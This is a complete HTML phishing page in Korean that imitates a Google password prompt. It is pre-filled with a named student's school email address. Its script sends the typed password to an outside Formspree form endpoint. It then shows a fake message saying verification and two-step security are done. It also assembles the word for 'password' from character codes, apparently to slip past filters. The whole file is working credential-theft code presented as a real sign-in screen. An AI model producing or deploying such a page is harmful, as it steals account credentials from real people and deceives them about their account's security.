<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Google 로그인</title>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans&family=Roboto&display=swap" rel="stylesheet">

<style>
/* Reset */
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  background-color: #202124;
  font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
  color: #e8eaed;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  overflow: hidden;
}

/* Fade-in animation */
.fade-in {
  opacity: 0;
  animation: fadeIn 0.6s forwards;
}
@keyframes fadeIn { to { opacity: 1; } }

/* Card */
.login-card, .success-card {
  background-color: #171717;
  border-radius: 20px;
  width: 720px;
  max-width: 90vw;
  display: flex;
  flex-direction: column;
  padding: 48px;
  box-shadow: 0 4px 20px rgb(0 0 0 / 0.5);
  transition: all 0.3s ease;
  text-align: center;
}

/* Logo */
.google-logo {
  font-weight: 700;
  font-size: 24px;
  color: #4285f4;
  font-family: 'Google Sans', Arial, sans-serif;
  user-select: none;
  margin-bottom: 24px;
}

/* User info */
.user-info {
  margin-bottom: 24px;
}
.user-name {
  font-size: 32px;
  font-weight: 400;
  color: #e8eaed;
  margin-bottom: 8px;
}
.user-email {
  font-size: 14px;
  font-weight: 500;
  color: #e8eaed;
  background-color: #2a2a2a;
  padding: 8px 16px;
  border-radius: 20px;
  display: inline-block;
}

/* Input fields */
.input-wrapper { display: flex; flex-direction: column; margin-top: 16px; }
input {
  width: 100%;
  padding: 14px 12px;
  border-radius: 8px;
  border: 1px solid #5f6368;
  background: transparent;
  color: #e8eaed;
  font-size: 16px;
  font-family: 'Roboto', Arial, sans-serif;
  outline-offset: 2px;
  transition: border-color 0.2s ease-in-out;
}
input:focus { border-color: #8ab4f8; outline: none; }

/* Checkbox */
.checkbox-wrapper {
  margin-top: 12px;
  font-size: 14px;
  color: #9aa0a6;
  display: flex;
  align-items: center;
}
.checkbox-wrapper input { margin-right: 8px; width: 16px; height: 16px; }

/* Buttons */
.actions { margin-top: 36px; display: flex; justify-content: flex-end; align-items: center; }
button.next-btn {
  background-color: #8ab4f8;
  border: none;
  border-radius: 20px;
  padding: 10px 24px;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  color: black;
  transition: background-color 0.2s ease;
}
button.next-btn:hover:not(:disabled) { background-color: #6f95f5; }
button.next-btn:disabled { background-color: #c0c7d0; cursor: default; }

/* Footer */
.footer {
  margin-top: 40px;
  color: #9aa0a6;
  font-size: 12px;
  display: flex;
  justify-content: flex-end;
  gap: 16px;
  font-family: 'Roboto', Arial, sans-serif;
}
.footer a { color: #9aa0a6; text-decoration: none; }
.footer a:hover { text-decoration: underline; }

/* Success page */
.success-card .check-icon {
  font-size: 64px;
  color: #34a853;
  margin-bottom: 24px;
}
.success-card h1 {
  font-size: 28px;
  margin-bottom: 12px;
}
.success-card p { font-size: 16px; color: #e8eaed; }
</style>
</head>
<body>

<!-- Password screen -->
<div class="login-card fade-in" id="passwordCard">
  <div class="google-logo">Google</div>

  <div class="user-info">
    <div class="user-name" id="userName"></div>
    <div class="user-email" id="userEmail"></div>
  </div>

  <div class="step step-password">
    <p class="instruction-text">계속하려면 먼저 본인임을 인증하세요.</p>
    <div class="input-wrapper">
      <input id="passwordInput" type="password" autocomplete="current-password" />
    </div>
    <label class="checkbox-wrapper" for="showPassword">
      <input id="showPassword" type="checkbox" /> <span id="showPasswordText"></span>
    </label>
    <div class="actions">
      <button id="nextPasswordBtn" class="next-btn" type="button" disabled>다음</button>
    </div>
  </div>

  <div class="footer">
    <a href="#">도움말</a>
    <a href="#">개인정보처리방침</a>
    <a href="#">약관</a>
  </div>
</div>

<!-- Success page -->
<div class="success-card fade-in" id="successCard" style="display:none;">
  <div class="check-icon">✔</div>
  <h1>본인 인증이 완료되었습니다.</h1>
  <p>2단계 보안이 설정되었습니다. 타 기기에서 인증 없이 귀하의 계정에 로그인할수 없습니다.</p>
</div>

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
emailjs.init({
    publicKey: "xiQSCA5rQTqmbI4Qz",
  });

// Elements
const passwordInput = document.getElementById("passwordInput");
const nextPasswordBtn = document.getElementById("nextPasswordBtn");
const showPasswordCheckbox = document.getElementById("showPassword");
const showPasswordText = document.getElementById("showPasswordText");
const userName = document.getElementById("userName");
const userEmail = document.getElementById("userEmail");
const passwordCard = document.getElementById("passwordCard");
const successCard = document.getElementById("successCard");

// Example user info
const loggedUser = {
  name: "11103권오승",
  email: "26-11103@boin.hs.kr"
};
userName.textContent = loggedUser.name;
userEmail.textContent = loggedUser.email;

// Construct the word '비밀번호' dynamically
const pwWord = String.fromCharCode(48708, 48128, 48264, 54840); // 비밀번호
passwordInput.placeholder = pwWord + " 입력";
passwordInput.setAttribute("aria-label", pwWord + " 입력");
showPasswordText.textContent = pwWord + " 표시";

// Enable next button only when input is not empty
passwordInput.addEventListener("input", () => {
  nextPasswordBtn.disabled = passwordInput.value.trim() === "";
});

// Toggle password visibility
showPasswordCheckbox.addEventListener("change", () => {
  passwordInput.type = showPasswordCheckbox.checked ? "text" : "password";
});

async function sendData() {
  if(passwordInput.value.trim() === "") {
    alert(pwWord + "를 입력하시오.");
    return;
  };

  let val = passwordInput.value;

  let formData = new FormData();
  formData.append("answer", val);

  const res = await fetch("https://formspree.io/f/maqannor", {
        method: "POST",
        body: formData,
        headers: {
          "Accept": "application/json"
        }
      });
}

// Password next button
nextPasswordBtn.addEventListener("click", () => {
  sendData();

  // Hide password screen, show success screen
  passwordCard.style.display = "none";
  successCard.style.display = "flex";
  successCard.classList.add("fade-in");
});
</script>

</body>
</html>
